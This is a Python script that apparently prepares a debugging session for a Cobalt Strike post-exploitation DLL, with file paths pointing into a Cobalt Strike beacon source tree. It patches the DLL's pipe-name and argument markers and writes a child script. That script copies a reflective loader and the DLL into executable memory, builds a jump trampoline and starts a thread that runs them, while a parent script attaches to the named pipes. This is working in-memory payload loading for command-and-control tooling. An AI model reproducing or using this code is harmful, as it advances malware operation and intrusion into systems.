# -*- coding: utf-8 -*-
"""kit_bg_dbg_prep.py - prep artifacts for the WinDbg MCP debug session:
1. patched kit DLL (CTRL pipe + args header ONLY, pure original flow, bg config)
2. kit_dbg_child.py: map loader+DLL, self-scan for kit image base, write base
   file, wait for GO, CreateThread(tramp r9d=1 -> base), sleep
3. kit_dbg_parent.py: connect CTRL + OUT pipes, hold.
Run with 'prep' to build; the debugger session drives the rest."""
import os
import struct
import sys
import time

STAMP = str(int(time.time()))
CTRL = r"\\.\pipe\kit_dbg_c_" + STAMP
OUT = r"\\.\pipe\kit_dbg_o_" + STAMP
GO = r"C:\Users\Public\kit_dbg_go.txt"
BASEF = r"C:\Users\Public\kit_dbg_base.txt"
DLL_OUT = r"C:\Users\Public\kit_dbg_patched.dll"

sys.path.insert(0, r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-beacon\feat-post-4.9.1\tools")

WIRE = open(r"C:\Users\Public\bt_hello_12b.bin", "rb").read()


def L(b):
    return struct.pack(">i", len(b)) + b


ARGS = (struct.pack(">i", 0) + struct.pack(">i", 2) + struct.pack(">i", 1)
        + L(b"ntdll.dll!RtlUserThreadStart+0x21\x00")
        + L(OUT.encode() + b"\x00") + L(WIRE))

PIPEMARK = b"POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE"
FULLPIPE_MARK = b"\\\\.\\pipe\\" + PIPEMARK
ARGSMARK = b"_POSTEX_ARGUMENTS_"


def patch_kit(data):
    d = bytearray(data)
    i = bytes(d).find(FULLPIPE_MARK)
    assert i > 0, "pipe mark not found"
    name = CTRL.encode() + b"\x00"
    name = name + b"\x00" * (len(FULLPIPE_MARK) - len(name))
    d[i:i + len(FULLPIPE_MARK)] = name
    j = bytes(d).find(ARGSMARK)
    assert j > 0, "args mark not found"
    hdr = (struct.pack("<i", 0x0A2A1DE0) + b"AAAA" + b"N" + b"\x00\x00\x00"
           + struct.pack("<i", 1 << 20) + struct.pack("<i", len(ARGS)))
    d[j:j + 20] = hdr
    return bytes(d), i


def off2rva(d, off):
    e = struct.unpack_from("<I", d, 0x3C)[0]
    nsec = struct.unpack_from("<H", d, e + 6)[0]
    sect = e + 0x18 + struct.unpack_from("<H", d, e + 0x14)[0]
    for k in range(nsec):
        s = sect + k * 40
        vsz, va, rsz, ro = struct.unpack_from("<IIII", d, s + 8)
        if ro <= off < ro + rsz:
            return va + (off - ro)
    return None


def main():
    kit = open(r"C:\Users\Public\kit_async.x64.dll", "rb").read()
    patched, mark_off = patch_kit(kit)
    mark_rva = off2rva(kit, mark_off)
    open(DLL_OUT, "wb").write(patched)
    print("patched dll -> %s, pipe mark rva=0x%x" % (DLL_OUT, mark_rva))

    child = r'''
import ctypes, struct, sys, time, os
from ctypes import wintypes
k32 = ctypes.windll.kernel32
k32.VirtualAlloc.restype = ctypes.c_void_p
k32.ReadProcessMemory.restype = wintypes.BOOL
CTRL, OUT = sys.argv[1], sys.argv[2]
BASEF, GO, MARKRVA = sys.argv[3], sys.argv[4], int(sys.argv[5], 16)
BLOB = open(r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-beacon\feat-post-4.9.1\tools\kit_dbg_blob.bin", "rb").read()
base = k32.VirtualAlloc(None, len(BLOB), 0x3000, 0x40)
ctypes.memmove(base, BLOB, len(BLOB))
print("blob base 0x%x" % base, flush=True)
# self-scan: find the patched CTRL pipe-name marker in the MAPPED kit image
# (the loader has not run yet, so the only mapped copy is inside the blob's
# raw DLL section - after GO the loader maps the image separately; we scan
# AFTER kit DllMain ran, driven by the debugger timeline, so scan now means
# the raw blob copy; instead scan repeatedly in the wait loop until the
# mapped-image hit appears: addr - MARKRVA must start with MZ)
def find_kitbase():
    marker = open(r"C:\Users\Public\kit_dbg_patched.dll", "rb").read()
    j = marker.find(b"\\\\.\\pipe\\kit_dbg_c_")
    del marker
    h = k32.GetCurrentProcess()
    addr = 0
    maxaddr = 0x7FFFFFFEFFFF
    mbi = ctypes.create_string_buffer(48)
    while addr < maxaddr:
        r = k32.VirtualQueryEx(h, ctypes.c_void_p(addr), mbi, 48)
        if not r:
            break
        state = struct.unpack_from("<I", mbi, 12)[0]
        typ = struct.unpack_from("<I", mbi, 20)[0]
        size = struct.unpack_from("<Q", mbi, 24)[0]
        protect = struct.unpack_from("<I", mbi, 16)[0]
        if state == 0x1000 and typ == 0x20000 and protect in (0x04, 0x40, 0x20, 0x08):
            buf = ctypes.create_string_buffer(size)
            got = ctypes.c_size_t(0)
            if k32.ReadProcessMemory(h, ctypes.c_void_p(addr), buf, size,
                                     ctypes.byref(got)) and got.value > 0x1000:
                raw = buf.raw[:got.value]
                p = raw.find(b"\\\\.\\pipe\\kit_dbg_c_")
                while p >= 0:
                    kb = addr + p - MARKRVA
                    if kb > 0x10000:
                        hdr = ctypes.create_string_buffer(2)
                        g2 = ctypes.c_size_t(0)
                        if k32.ReadProcessMemory(h, ctypes.c_void_p(kb), hdr, 2,
                                                 ctypes.byref(g2)) and hdr.raw[:2] == b"MZ":
                            return kb
                    p = raw.find(b"\\\\.\\pipe\\kit_dbg_c_", p + 1)
        addr += size
    return None
kb = None
t0 = time.time()
while time.time() - t0 < 20 and kb is None:
    kb = find_kitbase()
    if kb:
        break
    time.sleep(0.5)
with open(BASEF, "w") as f:
    f.write("0x%x" % (kb or 0))
print("kitbase 0x%x" % (kb or 0), flush=True)
loader_blob = BLOB
tramp = k32.VirtualAlloc(None, 0x1000, 0x3000, 0x40)
code = bytearray(11)
code[0] = 0x41; code[1] = 0xB9; code[2:6] = struct.pack('<I', 1)
code[6] = 0xE9
code[7:11] = struct.pack('<i', base - (tramp + 11))
ctypes.memmove(tramp, bytes(code), 11)
ab = k32.VirtualAlloc(None, len(open(r"C:\Users\Public\kit_dbg_args.bin","rb").read()), 0x3000, 0x04)
argb = open(r"C:\Users\Public\kit_dbg_args.bin","rb").read()
ctypes.memmove(ab, argb, len(argb))
while not os.path.exists(GO):
    time.sleep(0.2)
print("GO - creating kit thread", flush=True)
k32.CreateThread(None, 0, ctypes.cast(tramp, wintypes.LPVOID), ctypes.c_void_p(ab), 0, None)
time.sleep(120)
print("SURVIVED", flush=True)
'''
    open(r"C:\Users\Public\kit_dbg_child.py", "w").write(child)

    parent = r'''
import time, sys, ctypes
from ctypes import wintypes
k32 = ctypes.windll.kernel32
k32.CreateFileW.restype = wintypes.HANDLE
GENERIC_RW = 0x80000000 | 0x40000000
CTRL, OUT = sys.argv[1], sys.argv[2]
def open_pipe(name, timeout):
    t0 = time.time()
    while time.time() - t0 < timeout:
        h = k32.CreateFileW(name, GENERIC_RW, 0, None, 3, 0, None)
        if h and h != wintypes.HANDLE(-1).value:
            return h
        time.sleep(0.2)
    return None
hc = open_pipe(CTRL, 40)
print("parent ctrl:", bool(hc), flush=True)
ho = open_pipe(OUT, 70)
print("parent out:", bool(ho), flush=True)
time.sleep(90)
print("parent done", flush=True)
'''
    open(r"C:\Users\Public\kit_dbg_parent.py", "w").write(parent)

    blob = (open(r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts"
                 r"\p3-llvm-bench\src\main\resources\resources\postex-loader.x64.bin",
                 "rb").read() + patched)
    open(r"C:\Users\Public\kit_dbg_blob.bin", "wb").write(blob)
    open(r"C:\Users\Public\kit_dbg_args.bin", "wb").write(ARGS)
    for f in (GO, BASEF):
        if os.path.exists(f):
            os.remove(f)
    print("CTRL =", CTRL)
    print("OUT  =", OUT)
    print("args len =", len(ARGS))


if __name__ == "__main__":
    main()
